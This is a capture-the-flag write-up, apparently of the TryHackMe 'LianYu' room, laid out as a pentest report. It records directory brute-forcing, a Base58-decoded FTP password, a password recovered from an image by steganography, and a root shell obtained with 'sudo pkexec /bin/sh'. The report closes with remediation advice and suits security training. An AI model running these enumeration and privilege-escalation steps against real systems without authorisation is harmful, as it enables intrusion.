### A THM Room

#### By Sovren

# Executive Summary

This assessment identified multiple vulnerabilities across the target system, including exposed services, weak credential handling, insecure file storage, and misconfigured privilege escalation controls.

An attacker was able to:
- Enumerate services and hidden web content
- Extract credentials through encoded and steganographic data
- Gain initial access via FTP and SSH
- Escalate privileges to root using misconfigured `sudo` permissions

The system was ultimately fully compromised.

# Reconnaissance

Webpage on a DC character called Oliver, or Arrow. First season of the TV show specifically. It is stated that no knowledge of the Arrow-verse series is required.

### Nmap

```
sudo nmap -sC -sV --version-intensity 5 -O --osscan-guess -T4 -Pn 10.113.136.186 -p-

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp    open  http    Apache httpd
|_http-title: Purgatory
111/tcp   open  rpcbind
39153/tcp open  rpcbind
Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.13 (96%), Linux 4.4 (96%), Linux 3.10 - 3.13 (95%), Linux 5.4 (94%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 6.0 - 9.0 (Linux 3.18 - 4.4) (92%), Android 7.1.1 - 7.1.2 (92%)
No exact OS matches for host (test conditions non-ideal).
```

# Enumeration 

### Gobuster

```
gobuster dir -u http://10.113.136.186 -w /usr/share/wordlists/dirb/common.txt

index.html           (Status: 200) [Size: 2506]
server-status        (Status: 403) [Size: 199]
```

---

```
gobuster dir -u http://10.113.136.186 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt

island               (Status: 301) [Size: 237] [--> http://10.113.136.186/island/]
```

##### /island

Information extracted from this page was the code word:
**vigilante** 

Another gobuster scan revealed:
```
gobuster dir -u http://10.114.174.51/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   
2100                 (Status: 301) [Size: 241] [--> http://10.114.174.51/island/2100/]
```

##### /island/2100

A hint suggested locating a file with a `.ticket` extension.

```
gobuster dir -u http://10.114.174.51/island/2100 -w /usr/share/wordlists/dirb/common.txt -x ticket

green_arrow.ticket   (Status: 200) [Size: 71]
```
Using extension-based brute forcing revealed:
`green_arrow.ticket`

Contents:
`RTy8yhBQdscX`

This value was decoded (Base58) to obtain FTP credentials:

- **Username:** vigilante
- **Password:** !#th3h00d

##### /island/2100/green_arrow.ticket

This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX

It is base58 encoded data that reveals a password for FTP access:

**!#th3h00d**
`vigilante:!#th3h00d`

#### FTP Files

Enumerating the ftp server revealed:

```
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
```

###### Steganography in Image
File: `aa.jpg`
Using steganography extraction:
- Hidden archive (`ss.zip`) discovered
- Password used: `password`

Extracted credential:
- **Password:** `M3tahuman`

###### User Enumeration

File `.other_user` contained potential usernames.

Valid credentials identified:

- **Username:** slade
- **Password:** M3tahuman

# Privilege Escalation

`uname -a`
```
Linux LianYu 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt9-2 (2015-04-13) x86_64 GNU/Linux
```

`sudo -l`
```
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

`find / -perm -4000 2>/dev/null`
```
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/procmail
/usr/bin/newgrp
/usr/bin/sudo
/usr/sbin/exim4
/bin/su
/bin/mount
/bin/umount
/sbin/mount.nfs
```

### Exploiting pkexec sudo permissions

Because the user slade can run pkexec as sudo, we can use this to gain root access by running the following command:
```
sudo pkexec /bin/sh 
```

Enter slade's password and we have root access. 

The last flag can be found in `/root/root.txt`

# Findings & Recommendations – Summary

- **Weak Credential Exposure (High Risk):** Credentials were stored in encoded/steganographic files. 
*Recommendation*: Use secure storage; avoid exposing secrets in public files.

- **Insecure FTP Configuration (High Risk):** FTP allowed access to sensitive files. 
*Recommendation*: Disable unnecessary FTP; use SFTP.

- **Information Disclosure (Medium Risk):** Hidden comments/directories revealed sensitive hints. 
*Recommendation*: Remove comments and metadata from production systems.

- **Weak User Credential Management (High Risk):** Reused passwords across services. 
*Recommendation*: Enforce strong passwords and multi-factor authentication.

- **Misconfigured Sudo Permissions (Critical Risk):** User could execute `pkexec` as root. 
*Recommendation*: Limit sudo to necessary binaries and audit privilege escalation paths.

**Conclusion:** Multiple high-risk vulnerabilities—including weak credentials, insecure services, and misconfigured permissions—enabled full system compromise from unauthenticated access to root. Proper credential management, service hardening, and privilege auditing are essential to prevent such complete takeovers.